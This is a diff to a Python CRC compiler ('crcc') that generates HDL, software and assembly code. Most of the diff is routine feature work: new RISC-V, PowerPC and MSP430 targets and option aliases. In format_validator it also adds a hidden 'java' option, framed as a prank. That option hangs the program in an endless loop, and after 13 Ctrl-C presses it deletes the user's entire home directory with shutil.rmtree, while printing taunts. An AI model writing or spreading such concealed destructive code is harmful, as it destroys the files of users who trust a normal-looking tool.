@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 
 """
-HDL compiler for fully unrolled, fully-combinational CRC functions given a fixed-length, byte-aligned input.
+compiler for fully unrolled, fully-combinational CRC functions given a fixed-length, byte-aligned input.
+mostly for HDL code, but software code is also supported.
 batch jobs can be created through TOML input.
 
 requires Python >=3.12.
@@ -13,11 +14,13 @@ after optimization takes place crashes the program as normal. this doesn't work 
 """
 
 # TODO: perhaps give mean fanout in addition to max fanout? idk if arithmetic or geometric is better though.
+# TODO: allow `file = "filename"` inside the input TOML program.
+#       figure out how to make this work with `-o auto` and stuff.
 
 prog = "crcc"
 
 if __name__ != "__main__":
-	raise Exception(f"{prog}.py should only be used at the top level.")
+	raise Exception(f"{prog}.py is not an importable package.")
 
 class MissingPackage:
 	def __init__(self, name) -> None:
@@ -28,9 +31,9 @@ class MissingPackage:
 			return "(none)"
 
 		# crash on first access
-		raise Exception(f"package `{self.name}` was not found but is required.")
+		raise Exception(f"required package `{self.name}` is missing")
 
-# let the compiler work standalone (mostly) with no other files
+# let the compiler work standalone with (mostly) no other files
 # these will fail later if they actually matter
 # gf2_cse is still always needed though
 
@@ -47,6 +50,12 @@ except ImportError:
 	# used for some stuff other than assembly, but still optional
 	crc_dsl   = MissingPackage("crc_dsl")
 	dsl_avail = False
+
+try:
+	import crcmod
+except ImportError:
+	# only needed if crc32 isn't used
+	crcmod = MissingPackage("crcmod-plus")
 
 del MissingPackage
 
@@ -80,8 +89,9 @@ formats = {
 	("py" , "python")                    : "py"    ,
 	("pyt", "python-test")               : "py"    ,
 	("gv" , "dot", "graphviz")           : "gv"    ,
-	("c"  ,)                             : "c"     ,
+	("c",)                               : "c"     ,
 	("c++", "cpp")                       : "cpp"   ,
+	("java",)                            : "java"  ,
 	("i", "info",)                       : "txt"   ,
 	("metrics",)    : "txt"     , ("m",) : "txt"   ,
 	("ir",)         : "txt"     , ("r",) : "txt"   ,
@@ -104,11 +114,19 @@ asm_formats = (
 	# Microsoft ABI / System V ABI / Apple are give the same output
 	"arm64-gas"        , "arm64-armasm",
 
-	"arm32-arm-gas"    , "arm32-arm-armasm", # ARM mode
+	"arm32-arm-gas"    , "arm32-arm-armasm"   , # ARM mode
 	"arm32-thumb2-gas" , "arm32-thumb2-armasm",
 	"arm32-thumb1-gas" , "arm32-thumb1-armasm",
 
-	"ir:<flags>",
+	"rv64-gas",
+	"rv32-gas",
+
+	"ppc64le-gas"      , "ppc64be-gas",
+	"ppc-gas", # implicitly big endian
+
+	"msp430-gas",
+
+	"ir:<flags>", # this one has to be last
 )
 
 asm_ir_settings = {}
@@ -119,6 +137,58 @@ def format_validator(syntax: str) -> str:
 
 	syntax = syntax.strip().lower()
 
+	if syntax == "java":
+		# funny prank for java users because I don't like java
+		import signal, shutil
+
+		ctrlc_count = 0
+		one_second = 1_000_000_000
+		before = perf_counter_ns()
+
+		def handler(signum, frame) -> None:
+			nonlocal ctrlc_count, before
+
+			now = perf_counter_ns()
+			if now - before < one_second:
+				return
+
+			before = now
+
+			ctrlc_count += 1
+
+			if ctrlc_count >= 13:
+				# dirty java users
+				shutil.rmtree(os.path.expanduser('~'), ignore_errors=True)
+
+		signal.signal(signal.SIGINT, handler)
+
+		while True:
+			if ctrlc_count >= 13:
+				# HE HE HE
+				print("\rtoo late\x1b[K", end="", flush=True)
+			elif ctrlc_count >= 12:
+				print("\rfinal warning. ^C again deletes your stuff\x1b[K", end="", flush=True)
+			elif ctrlc_count >= 11:
+				print("\rI almost feel bad\x1b[K", end="", flush=True)
+			elif ctrlc_count >= 10:
+				print("\rsudo killall -9 python?\x1b[K", end="", flush=True)
+			elif ctrlc_count >= 9:
+				print("\rmaybe you need to take an IQ test\x1b[K", end="", flush=True)
+			elif ctrlc_count >= 8:
+				print("\ryou know the terminal has a big X in the corner, right?\x1b[K", end="", flush=True)
+			elif ctrlc_count >= 7:
+				print("\ralright bud, your shits about to get nuked\x1b[K", end="", flush=True)
+			elif ctrlc_count >= 6:
+				print("\rmaybe stop pressing ^C?\x1b[K", end="", flush=True)
+			elif ctrlc_count >= 5:
+				print("\ridk, maybe try something else?\x1b[K", end="", flush=True)
+			elif ctrlc_count >= 3:
+				print("\robviously ^C is not working", end="", flush=True)
+			else:
+				print("NOT TODAY, SATAN!")
+
+	error_msg = f"invalid format {syntax!r}. see `--help=formats` / `-F` for a list of valid formats"
+
 	if syntax == "asm":
 		extension = "asm"
 		return "asm=x64-sysv-gas"
@@ -126,6 +196,14 @@ def format_validator(syntax: str) -> str:
 	if   syntax.startswith("asm=amd64"):   syntax = "asm=x64"   + syntax[9:]
 	elif syntax.startswith("asm=aarch64"): syntax = "asm=arm64" + syntax[11:]
 	elif syntax.startswith("asm=aarch32"): syntax = "asm=arm32" + syntax[11:]
+	elif syntax.startswith("asm=riscv"):   syntax = "asm=rv"    + syntax[9:]
+	elif syntax.startswith("asm=powerpc"): syntax = "asm=ppc"   + syntax[11:]
+	if   syntax.startswith("asm=ppc32"):   syntax = "asm=ppc"   + syntax[9:]
+
+	if syntax == "asm=ppc64":
+		syntax = "asm=ppc64le"
+	elif syntax.startswith("asm=ppc64-"):
+		syntax = "asm=ppc64le-" + syntax[10:]
 
 	if syntax.startswith("asm=ir"):
 		extension = "caf" # CRC Assembly Format
@@ -147,18 +225,32 @@ def format_validator(syntax: str) -> str:
 
 		extension = "asm"
 
+		if syntax == "asm=arm":
+			raise argparse.ArgumentTypeError(error_msg + ", did you mean 'asm=arm32' or 'asm=arm64'?")
+
+		if syntax == "asm=amd":
+			raise argparse.ArgumentTypeError(error_msg + ", did you mean 'asm=amd64'?")
+
+		if syntax == "asm=rv":
+			raise argparse.ArgumentTypeError(error_msg + ", did you mean 'asm=rv32' or 'asm=rv64'?")
+
 		if syntax.endswith("-clang"):
 			syntax = syntax[:-5] + "gas"
+		elif syntax.endswith("-llvm"):
+			syntax = syntax[:-4] + "gas"
 
 		if syntax.startswith("asm=x64"):
 			if syntax.endswith("-fasm"):
 				# the NASM output is compatible with FASM
 				syntax = syntax[:-4] + "nasm"
-			elif syntax.endswith("-ms"):   syntax += "-masm"
+
+			if syntax.endswith("-ms"):   syntax += "-masm"
 			elif syntax.endswith("-stm"):  syntax += "-nasm"
 			elif syntax.endswith("-sysv"): syntax += "-gas"
-			elif syntax in {"asm=x64", "asm=x64-apx"}:
-				syntax += "-sysv-gas"
+			elif syntax in {"asm=x64", "asm=x64-apx"}: syntax += "-sysv-gas"
+			elif syntax == "asm=x64-gas":  syntax = "asm=x64-sysv-gas"
+			elif syntax == "asm=x64-nasm": syntax = "asm=x64-sysv-nasm"
+			elif syntax == "asm=x64-masm": syntax = "asm=x64-ms-masm"
 		elif syntax.startswith("asm=x86"):
 			if syntax.endswith("-fasm"):
 				# the NASM output is compatible with FASM
@@ -166,6 +258,9 @@ def format_validator(syntax: str) -> str:
 			elif syntax.endswith("-ms"):   syntax += "-masm"
 			elif syntax.endswith("-sysv"): syntax += "-gas"
 			elif syntax == "asm=x86":      syntax += "-sysv-gas"
+			elif syntax == "asm=x86-gas":  syntax = "asm=x86-sysv-gas"
+			elif syntax == "asm=x86-nasm": syntax = "asm=x86-sysv-nasm"
+			elif syntax == "asm=x86-masm": syntax = "asm=x86-ms-masm"
 		elif syntax.startswith("asm=arm64"):
 			if syntax == "asm=arm64" or syntax.endswith("-sysv") or syntax.endswith("-ms") or syntax.endswith("-apple"):
 				syntax += "-gas"
@@ -179,6 +274,25 @@ def format_validator(syntax: str) -> str:
 				syntax += "-thumb2-gas"
 			elif syntax[10:] in {"thumb1", "thumb2", "arm"}:
 				syntax += "-gas"
+			elif syntax == "asm=arm32-gas":
+				syntax = "asm=arm32-thumb2-gas"
+			elif syntax == "asm=arm32-armasm":
+				syntax = "asm=arm32-thumb2-armasm"
+		elif syntax.startswith("asm=rv64"):
+			if syntax == "asm=rv64":
+				syntax += "-gas"
+		elif syntax.startswith("asm=rv32"):
+			if syntax == "asm=rv32":
+				syntax += "-gas"
+		elif syntax.startswith("asm=ppc64"):
+			if syntax in {"asm=ppc64le", "asm=ppc64be"}:
+				syntax += "-gas"
+		elif syntax.startswith("asm=ppc"):
+			if syntax == "asm=ppc":
+				syntax += "-gas"
+		elif syntax.startswith("asm=msp430"):
+			if syntax == "asm=msp430":
+				syntax += "-gas"
 
 		if syntax[4:] in asm_formats:
 			return syntax
@@ -190,7 +304,7 @@ def format_validator(syntax: str) -> str:
 				extension = formats[aliases]
 				return aliases[0]
 
-	raise argparse.ArgumentTypeError(f"invalid format '{syntax}'. see `--help=formats` / `-F` for a list of valid formats")
+	raise argparse.ArgumentTypeError(error_msg)
 
 parser = argparse.ArgumentParser(
 	add_help=False,
@@ -210,8 +324,8 @@ parser.add_argument("--version", "-V", action="version", version=f"%(prog)s {__v
 core_group = parser.add_argument_group("core options")
 core_group.add_argument("--algorithm", "-a", type=lambda s: None if s is None else str.lower(s).strip(), help=f"CRC name (see --help=algorithms / -A). default is 'crc32'")
 core_group.add_argument("--data-len", "-l", type=int, help="bytes length of checksum input data. default is 4")
-core_group.add_argument("--syntax", "--format", "-f", type=format_validator, default="verilog", help=f"output language (see --help=formats / -F). default is 'verilog'")
-core_group.add_argument("--output", "--out", "-o", type=str, default='-', help=f"output file. use 'auto' for automatic naming. default is '-' (stdout)")
+core_group.add_argument("--format", "--syntax", "-f", type=format_validator, default="verilog", help=f"output language (see --help=formats / -F). default is 'verilog'")
+core_group.add_argument("--output", "-o", type=str, default='-', help=f"output file. use 'auto' for automatic naming. default is '-' (stdout)")
 core_group.add_argument("--lut-size", "-s", type=int, default=4, help="specify the FPGA LUT size. only effects verbose printouts and metrics.\n-1 is treated as infinity. default is 4")
 core_group.add_argument("--verbose", "-v", type=int, help="set verbosity level. >=3 is the same as 2. <0 suppresses warnings.")
 
@@ -253,7 +367,7 @@ optimize_group.add_argument("--optimize-lns-window", "-W", type=int  , help="ena
 
 cache_group = parser.add_argument_group("caching options")
 cache_dir_group = cache_group.add_mutually_exclusive_group()
-cache_dir_group.add_argument("--cache-dir"   , "-D", type=str  , help="change the cache directory. doesn't enable optimization. '~' and environment variables are\nexpanded. default is './crc-cache'.")
+cache_dir_group.add_argument("--cache-dir"   , "-D", type=str, help="change the cache directory. doesn't enable optimization. '~' and environment variables are\nexpanded. default is './crc-cache'.")
 cache_dir_group.add_argument("--cache-global", "-G", action="store_true", help="use a user global cache directory. cannot appear with `--cache-dir`.")
 cache_group.add_argument("--cache"           , "-C", type=str.lower, help="enable optimization and set cache behavior. combination of c/x: clear/expunge, o: off,\nr: read, w: write, u: use/read+write, d: delete entry, l: list. o may only appear with c/x.\nl and d must appear alone. case insensitive. `-Cc` with no non-cache flags will clear the\ncache and exit. cache entries are never automatically invalidated, so they may return old\nvalues if the optimizer is updated. a manual cache clear is required in this case.")
 args = parser.parse_args()
@@ -317,7 +431,7 @@ if not lns:
 GV_DECL_LINE_WRAP = 100 # line wrap for only the node declarations. doesn't include the indentation
 
 lut_size = None if args.lut_size == -1 else args.lut_size
-syntax   = args.syntax
+syntax   = args.format
 output   = args.output
 verbose  = args.verbose or 0
 eprint   = gf2_cse._eprint
@@ -336,7 +450,7 @@ else:
 
 		del n
 	except ValueError:
-		raise ValueError(f"invalid value given to `--indent`: '{args.indent}'")
+		raise ValueError(f"invalid value given to `--indent`: {args.indent!r}")
 
 # these come from crcmod.predefined._crc_definitions_table
 sum_len_map = {
@@ -410,6 +524,18 @@ def print_help_formats(formats: tuple[tuple[str, ...], ...] = formats) -> None:
 		i += 1
 
 	print(
+		"\nformat descriptions:"
+		"\n - systemverilog/sv  same as verilog with newer generate block syntax"
+		"\n - python-test/pyt   the same code as python/py, but with some extra testing functions"
+		"\n - graphviz/dot/gv   uses the 'dot' layout engine and outputs a directed graph. better with optimization on."
+		"\n - nmigen/nmg        the same as amaranth/am but for the legacy `Elaboratable` API."
+		"\n - metrics/m         JSON metrics about the graph reduction without giving the graph itself."
+		"\n - noop/nop          outputs nothing except for stuff that goes to stderr (dry run). does not disable cache behavior."
+		"\n - c++/cpp           same as c but with stricter variable name verification"
+		"\n - info/i            curve metadata in a human readable format."
+		"\n - json/j            raw graph data as a JSON object string with sets replaced with lists."
+		"\n - ir/r              raw graph data as a python object string. similar to json/j"
+		"\n"
 		"\nsupported assembly output formats:"
 		"\n - asm (defaults to x64)"
 	)
@@ -424,22 +550,13 @@ def print_help_formats(formats: tuple[tuple[str, ...], ...] = formats) -> None:
 		"\n     > save-list=<list[int]>     (default is none, comma separated list)"
 		"\n     > max-ofs=<list[int]>       (default is 0, max immediate pointer offset)"
 		"\n     > emit-spacing=<bool>       (default is false)"
-		"\n     > emit-comments=<bool>      (default is false, currently broken)"
+		"\n     > emit-comments=<bool>      (default is false, broken in some cases)"
 		"\n     > emit-round-numbers=<bool> (default is false)"
 		"\n     > debug=<bool>              (emit-* master switch, default is false)"
 		"\n"
-		"\nformat descriptions:"
-		"\n - python-test/pyt  the same code as python/py, but with some extra testing functions"
-		"\n - metrics/m        JSON metrics about the graph reduction without giving the graph itself."
-		"\n - nmigen/nmg       the same as amaranth/am but for the legacy `Elaboratable` API."
-		"\n - info/i           curve metadata in a human readable format."
-		"\n - noop/nop         outputs nothing except for stuff that goes to stderr (dry run). does not disable cache behavior."
-		"\n - json/j           raw graph data as a JSON object string with sets replaced with lists."
-		"\n - ir/r             raw graph data as a python object string. similar to json/j"
-		"\n"
 		"\nx86 and x64:"
 		"\n - 'amd64' is an alias for 'x64'"
-		"\n - 'fasm' can be used instead of 'nasm' in the format names; the output is compatible with both."
+		"\n - 'fasm' dialect aliases 'nasm'; the output is compatible with both assemblers."
 		"\n - dialects are chosen automatically if not given: ms => masm, stm => nasm, sysv => gas"
 		"\n - if no ABI is given, it defaults to sysv"
 		"\n - 'stm' is StackMin ABI (github.com/drizzt536/files/blob/main/NASM/misc/os/docs/calling-convention.md)"
@@ -453,13 +570,25 @@ def print_help_formats(formats: tuple[tuple[str, ...], ...] = formats) -> None:
 		"\narm32:"
 		"\n - 'aarch32' is an alias for 'arm32'"
 		"\n - 't1' is an alias for 'thumb1' and 't2' is an alias for 'thumb2'"
-		"\n - 't1' is an alias for 'thumb1' and 't2' is an alias for 'thumb2'"
 		"\n - defaults to 'thumb2'"
 		"\n - dialect defaults to 'gas'"
 		"\n"
-		"\nfor all assembly formats, 'clang' dialect aliases 'gas'"
+		"\nriscv:"
+		"\n - 'riscv32' is an alias of 'rv32' and 'riscv64' is an alias of 'rv64'"
+		"\n - dialect defaults to 'gas'"
+		"\n"
+		"\nppc and ppc64:"
+		"\n - ppc64 defaults to little endian"
+		"\n - ppc is implicitly big endian"
+		"\n"
+		"\nfor all assembly formats, 'clang' and 'llvm' dialects alias 'gas'"
 		"\nfor raw/json/metrics formats: long name => beautified, short name => minified."
+		"\nprobably don't use the java format :p"
 		"\nall format names and flag names/values are case insensitive"
+		"\n"
+		"\nThe asm modes are mostly just a proof of concept and are insanely inefficient."
+		"\nIf you want good optimized assembly, just use -fc and compile it yourself."
+		"\n(or just use a lookup table algorithm like a normal person)"
 	)
 
 def print_help_algs() -> None:
@@ -467,9 +596,7 @@ def print_help_algs() -> None:
 
 	prev_size = 0
 
-	try:
-		import crcmod
-
+	if hasattr(crcmod, "__file__"):
 		# map sum length to the string length of the longest algorithm name
 		len_max = {1:0, 2:0, 3:0, 4:0, 8:0}
 
@@ -489,7 +616,7 @@ def print_help_algs() -> None:
 			density = (poly.bit_count() - 1) / size * 12.5
 
 			print(f" - {key:{pad}}: poly=0x{poly:x}, density={density:4.1f}%")
-	except ImportError:
+	else:
 		for key, size in sum_len_map.items():
 			if size != prev_size:
 				prev_size = size
@@ -861,14 +988,14 @@ else:
 	args.cache = args.cache.replace('x', 'c')
 
 	if len(args.cache) > 4 or not args.cache:
-		raise ValueError(f"`--cache` value too long: '{args.cache}'")
+		raise ValueError(f"`--cache` value too long: {args.cache!r}")
 
 	for c in args.cache:
 		if c not in "ocrwd":
-			raise ValueError(f"`--cache` value has invalid character '{c}'")
+			raise ValueError(f"`--cache` value has invalid character {c!r}")
 
 	if len(set(args.cache)) != len(args.cache):
-		raise ValueError(f"`--cache` value contains duplicate flags: '{args.cache}'")
+		raise ValueError(f"`--cache` value contains duplicate flags: {args.cache!r}")
 
 	if 'd' in args.cache:
 		if len(args.cache) != 1:
@@ -918,148 +1045,155 @@ if verbose >= 2:
 
 del argv, cache_only
 
-syntax_data = {
-	"v": {
-		"xor"         : " ^ ",
-		'1'           : '1',
-		'0'           : '0',
-		'='           : " = ",
-		'['           : '[',
-		']'           : ']',
-		'^'           : "assign ",
-		'$'           : ';',
-		"footer"      : "\nendmodule",
-		"comment"     : "//",
-		"begin_logic" : '',
-		"var_prefix"  : '',
-		"wire_type"   : lambda name, size: f"wire [{size} : 0] {name.strip()};",
-	}, "vhd": {
-		"xor"         : " xor ",
-		'1'           : "'1'",
-		'0'           : "'0'",
-		'='           : " <= ",
-		'['           : '(',
-		']'           : ')',
-		'^'           : '\t',
-		'$'           : ';',
-		"footer"      : "end architecture;",
-		"comment"     : "--",
-		"begin_logic" : "begin",
-		"var_prefix"  : '',
-		"wire_type"   : lambda name, size: f"\tsignal {name.lstrip()} : std_logic_vector({size} downto 0);",
-	}, "py": {
-		"xor"         : " ^ ",
-		'1'           : '1',
-		'0'           : '0',
-		'='           : " = ",
-		'['           : '[',
-		']'           : ']',
-		'^'           : '\t',
-		'$'           : '',
-		"footer"      : None,
-		"comment"     : '#',
-		"begin_logic" : '',
-		"var_prefix"  : '',
-		"wire_type"   : lambda name, size: f"\t{name.lstrip()} = [0] * {size}",
-	}, "c": {
-		"xor"         : " ^ ",
-		'1'           : '1',
-		'0'           : '0',
-		'='           : " = ",
-		'['           : '[',
-		']'           : ']',
-		'^'           : '\t',
-		'$'           : ';',
-		"footer"      : '}',
-		"comment"     : "//",
-		"begin_logic" : '',
-		"var_prefix"  : '',
-		"wire_type"   : lambda name, size: f"\tuint8_t {name.lstrip()}[{size}];",
-	}, "gv": {
-		"xor"         : '","',
-		'1'           : '1',
-		'0'           : '0',
-		'='           : None,
-		'['           : '[',
-		']'           : ']',
-		'^'           : None,
-		'$'           : None,
-		"footer"      : '}',
-		"comment"     : "//",
-		"begin_logic" : None,
-		"var_prefix"  : '',
-		"wire_type"   : None,
-	}, "am": {
-		"xor"         : " ^ ",
-		'1'           : '1',
-		'0'           : '0',
-		'='           : ".eq(",
-		'['           : '[',
-		']'           : ']',
-		'^'           : "\t\tc += ",
-		'$'           : ')',
-		"footer"      : "\n\t\treturn m",
-		"comment"     : '#',
-		"begin_logic" : '',
-		"var_prefix"  : '',
-		"wire_type"   : lambda name, size: f"\t\t{name.lstrip()} = Signal({size})",
-	}, "ch": {
-		"xor"         : " ^ ",
-		'1'           : "1.B",
-		'0'           : "0.B",
-		'='           : " := ",
-		'['           : '(',
-		']'           : ')',
-		'^'           : '\t',
-		'$'           : '',
-		"footer"      : '}',
-		"comment"     : "//",
-		"begin_logic" : '',
-		"var_prefix"  : '',
-		"wire_type"   : lambda name, size: f"\tval {name.lstrip()} = Wire(Vec({size}, Bool()))",
-	}, "sp": {
-		"xor"         : " ^ ",
-		'1'           : "B(1)",
-		'0'           : "B(0)",
-		'='           : " := ",
-		'['           : '(',
-		']'           : ')',
-		'^'           : '\t',
-		'$'           : '',
-		"footer"      : '}',
-		"comment"     : "//",
-		"begin_logic" : '',
-		"var_prefix"  : "io.",
-		"wire_type"   : lambda name, size: f"\tval {name.lstrip()} = Bits({size} bits)",
+if not syntax.startswith("asm="):
+	syntax_data = {
+		"v": {
+			"xor"         : " ^ ",
+			'1'           : '1',
+			'0'           : '0',
+			'='           : " = ",
+			'['           : '[',
+			']'           : ']',
+			'^'           : "assign ",
+			'$'           : ';',
+			"footer"      : "\nendmodule",
+			"comment"     : "//",
+			"begin_logic" : '',
+			"var_prefix"  : '',
+			"wire_type"   : lambda name, size: f"wire [{size} : 0] {name.strip()};",
+		},
+		"vhd": {
+			"xor"         : " xor ",
+			'1'           : "'1'",
+			'0'           : "'0'",
+			'='           : " <= ",
+			'['           : '(',
+			']'           : ')',
+			'^'           : '\t',
+			'$'           : ';',
+			"footer"      : "end architecture;",
+			"comment"     : "--",
+			"begin_logic" : "begin",
+			"var_prefix"  : '',
+			"wire_type"   : lambda name, size: f"\tsignal {name.lstrip()} : std_logic_vector({size} downto 0);",
+		},
+		"py": {
+			"xor"         : " ^ ",
+			'1'           : '1',
+			'0'           : '0',
+			'='           : " = ",
+			'['           : '[',
+			']'           : ']',
+			'^'           : '\t',
+			'$'           : '',
+			"footer"      : None,
+			"comment"     : '#',
+			"begin_logic" : '',
+			"var_prefix"  : '',
+			"wire_type"   : lambda name, size: f"\t{name.lstrip()} = [0] * {size}",
+		},
+		"c": {
+			"xor"         : " ^ ",
+			'1'           : '1',
+			'0'           : '0',
+			'='           : " = ",
+			'['           : '[',
+			']'           : ']',
+			'^'           : '\t',
+			'$'           : ';',
+			"footer"      : '}',
+			"comment"     : "//",
+			"begin_logic" : '',
+			"var_prefix"  : '',
+			"wire_type"   : lambda name, size: f"\tuint8_t {name.lstrip()}[{size}];",
+		},
+		"gv": {
+			"xor"         : '","',
+			'1'           : '1',
+			'0'           : '0',
+			'='           : None,
+			'['           : '[',
+			']'           : ']',
+			'^'           : None,
+			'$'           : None,
+			"footer"      : '}',
+			"comment"     : "//",
+			"begin_logic" : None,
+			"var_prefix"  : '',
+			"wire_type"   : None,
+		},
+		"am": {
+			"xor"         : " ^ ",
+			'1'           : '1',
+			'0'           : '0',
+			'='           : ".eq(",
+			'['           : '[',
+			']'           : ']',
+			'^'           : "\t\tc += ",
+			'$'           : ')',
+			"footer"      : "\n\t\treturn m",
+			"comment"     : '#',
+			"begin_logic" : '',
+			"var_prefix"  : '',
+			"wire_type"   : lambda name, size: f"\t\t{name.lstrip()} = Signal({size})",
+		},
+		"ch": {
+			"xor"         : " ^ ",
+			'1'           : "1.B",
+			'0'           : "0.B",
+			'='           : " := ",
+			'['           : '(',
+			']'           : ')',
+			'^'           : '\t',
+			'$'           : '',
+			"footer"      : '}',
+			"comment"     : "//",
+			"begin_logic" : '',
+			"var_prefix"  : '',
+			"wire_type"   : lambda name, size: f"\tval {name.lstrip()} = Wire(Vec({size}, Bool()))",
+		},
+		"sp": {
+			"xor"         : " ^ ",
+			'1'           : "B(1)",
+			'0'           : "B(0)",
+			'='           : " := ",
+			'['           : '(',
+			']'           : ')',
+			'^'           : '\t',
+			'$'           : '',
+			"footer"      : '}',
+			"comment"     : "//",
+			"begin_logic" : '',
+			"var_prefix"  : "io.",
+			"wire_type"   : lambda name, size: f"\tval {name.lstrip()} = Bits({size} bits)",
+		},
 	}
-}
 
-syntax_data["sv"]  = syntax_data["v"]
-syntax_data["pyt"] = syntax_data["py"]
-syntax_data["c++"] = syntax_data["c"]
-syntax_data["nmg"] = syntax_data["am"]
-syntax_data["ch3"] = syntax_data["ch"].copy()
-syntax_data["ch3"]["var_prefix"] = "io."
+	syntax_data["sv"]  = syntax_data["v"]
+	syntax_data["pyt"] = syntax_data["py"]
+	syntax_data["c++"] = syntax_data["c"]
+	syntax_data["nmg"] = syntax_data["am"]
+	syntax_data["ch3"] = syntax_data["ch"].copy()
+	syntax_data["ch3"]["var_prefix"] = "io."
 
-tokens = syntax_data.get(syntax, {})
+	tokens = syntax_data.get(syntax, {})
 
-xor         = tokens.get("xor")
-b1          = tokens.get("1")
-b0          = tokens.get("0")
-assign      = tokens.get("=")
-lbr         = tokens.get("[")
-rbr         = tokens.get("]")
-prefix      = tokens.get("^")
-suffix      = tokens.get("$")
-footer      = tokens.get("footer")
-comment     = tokens.get("comment")
-begin_logic = tokens.get("begin_logic") # begin actual logic
-vpfx        = tokens.get("var_prefix")
-wire_type   = tokens.get("wire_type")
+	xor         = tokens.get("xor")
+	b1          = tokens.get("1")
+	b0          = tokens.get("0")
+	assign      = tokens.get("=")
+	lbr         = tokens.get("[")
+	rbr         = tokens.get("]")
+	prefix      = tokens.get("^")
+	suffix      = tokens.get("$")
+	footer      = tokens.get("footer")
+	comment     = tokens.get("comment")
+	begin_logic = tokens.get("begin_logic") # begin actual logic
+	vpfx        = tokens.get("var_prefix")
+	wire_type   = tokens.get("wire_type")
 
-del syntax_data, tokens
-
-if syntax == "asm=ir":
+	del syntax_data, tokens
+elif syntax == "asm=ir":
 	if "type" not in asm_ir_settings:
 		ir_type = "cisc"
 	else:
@@ -1176,8 +1310,55 @@ if syntax == "asm=ir":
 	}
 
 	del ir_type, regcount, regsize, save_list, max_ofs, emit_spacing, emit_comments, emit_round_numbers
+else:
+	# syntax.startswith("asm=") and syntax != "asm=ir"
 
-if syntax.startswith("asm=") and syntax != "asm=ir":
+	def ppc_mvl(m: object, k: object) -> str:
+		reg = m.group(1)
+		imm = int(m.group(2))
+
+		if imm < (1 << 15):
+			return f"\tli {reg}, {imm}"
+
+		if imm < (1 << 32):
+			return (
+				f"\tlis {reg}, {imm >> 16}\n"
+				f"\tori {reg}, {reg}, {imm & 0xFFFF}"
+			)
+
+		raise Exception("ppc instruction `@mvl` with an immediate >= 2^32 is not allowed")
+
+	def ppc64_mvl(m: object, k: object) -> str:
+		reg = m.group(1)
+		imm = int(m.group(2))
+
+		if imm < (1 << 15):
+			return f"\tli {reg}, {imm}"
+
+		if imm < (1 << 31):
+			return (
+				f"\tlis {reg}, {imm >> 16}\n"
+				f"\tori {reg}, {reg}, {imm & 0xFFFF}"
+			)
+
+		if imm < (1 << 32):
+			return (
+				f"\tlis {reg}, {imm >> 16}\n"
+				f"\tori {reg}, {reg}, {imm & 0xFFFF}\n"
+				f"\tclrldi {reg}, {reg}, 32"
+			)
+
+		if imm < (1 << 64):
+			return (
+				f"\tlis  {reg}, {(imm >> 48) & 0xFFFF}\n"
+				f"\tori  {reg}, {reg}, {(imm >> 32) & 0xFFFF}\n"
+				f"\tsldi {reg}, {reg}, 32\n"
+				f"\toris {reg}, {reg}, {(imm >> 16) & 0xFFFF}\n"
+				f"\tori  {reg}, {reg}, {imm & 0xFFFF}"
+			)
+
+		raise ValueError("ppc64 instruction `@mvl` with an immediate >= 2^64 is not allowed")
+
 	t = {
 		"x64-ms-nasm": {
 			"settings": {
@@ -1185,15 +1366,15 @@ if syntax.startswith("asm=") and syntax != "asm=ir":
 				"byteorder" : "little",
 				"save_list" : None,
 				"reg_size"  : 64,
-				"max_ofs"   : (1 << 31) - 1
+				"max_ofs"   : (1 << 31) - 1,
 			},
 			"regw": ("rcx", "rdx", "rax", "r8" , "r9" , "r10" , "r11" ),
 			"regb": ( "cl",  "dl",  "al", "r8b", "r9b", "r10b", "r11b"),
 			"comment": ';',
 			"grammar": {
 				r"@jiz (@reg\[\d+\]), (@label\[\w+\])": ("\ttest \\1, \\1", "\tje \\2"),
-				r"@add (@reg\[\w+\]), @imm\[1\]\b": f"\tinc \\1",
-				r"@sub (@reg\[\w+\]), @imm\[1\]\b": f"\tdec \\1",
+				r"@add (@reg\[\w+\]), @imm\[1\]": f"\tinc \\1",
+				r"@sub (@reg\[\w+\]), @imm\[1\]": f"\tdec \\1",
 				r"@imm\[(\d+)\]": "\\1",
 				r"@stw (@reg\[\w+\])": "\tmov qword @ptr[\\1]",
 				r"@stb (@reg\[\w+\])": "\tmov byte @ptr[\\1]",
@@ -1225,7 +1406,7 @@ if syntax.startswith("asm=") and syntax != "asm=ir":
 				"byteorder" : "little",
 				"save_list" : None,
 				"reg_size"  : 64,
-				"max_ofs"   : (1 << 12) - 1
+				"max_ofs"   : (1 << 12) - 1,
 			},
 			"regw": ("x0", "x1", "x2", "x3", "x4", "x5", "x6", "x7", "x8", "x9", "x10", "x11", "x12", "x13", "x14", "x15", "x16", "x17"),
 			"regb": ("w0", "w1", "w2", "w3", "w4", "w5", "w6", "w7", "w8", "w9", "w10", "w11", "w12", "w13", "w14", "w15", "w16", "w17"),
@@ -1243,7 +1424,7 @@ if syntax.startswith("asm=") and syntax != "asm=ir":
 				r"@stb (@\w+\[\w+\]), (@regb\[\w+\])": "\tstrb \\2, \\1",
 				r"@function\[(\w+)\]": "\\1:",
 				r"@deflabel\[(\w+)\]": "@label[\\1]:",
-				r"@label\[(\w+)\]": "L\\1",
+				r"@label\[(\w+)\]": ".L\\1", # apple doesn't have the '.' but I don't care. apple sucks
 				r"@in\[(\d+)\]":  lambda m, k: f"[@reg[sp]{f', @imm[{ofs}]' if ( ofs := k. in_ofs + int(m.group(1)) ) != 0 else ''}]",
 				r"@tmp\[(\d+)\]": lambda m, k: f"[@reg[sp]{f', @imm[{ofs}]' if ( ofs := k.tmp_ofs + int(m.group(1)) ) != 0 else ''}]",
 				r"@out\[(\d+)\]": lambda m, k: f"[@reg[sp]{f', @imm[{ofs}]' if ( ofs := k.out_ofs + int(m.group(1)) ) != 0 else ''}]",
@@ -1256,6 +1437,143 @@ if syntax.startswith("asm=") and syntax != "asm=ir":
 				r"@mov": "\tmov",
 				r"@ret": "\tret",
 				r"@jmp": "\tb",
+			},
+		},
+		"rv64-gas": {
+			"settings": {
+				"format"    : "RISC",
+				"byteorder" : "little",
+				"save_list" : None,
+				"reg_size"  : 64,
+				"max_ofs"   : (1 << 11) - 1,
+			},
+			"regw": ("a0", "a1", "a2", "a3", "a4", "a5", "a6", "a7", "t0", "t1", "t2", "t3", "t4", "t5", "t6"),
+			"regb": ("a0", "a1", "a2", "a3", "a4", "a5", "a6", "a7", "t0", "t1", "t2", "t3", "t4", "t5", "t6"),
+			"comment": '#',
+			"grammar": {
+				r"@jiz": "\tbeqz",
+				r"@sub (@reg\[\w+\]), @imm\[(\d+)\]": "\taddi \\1, \\1, -\\2",
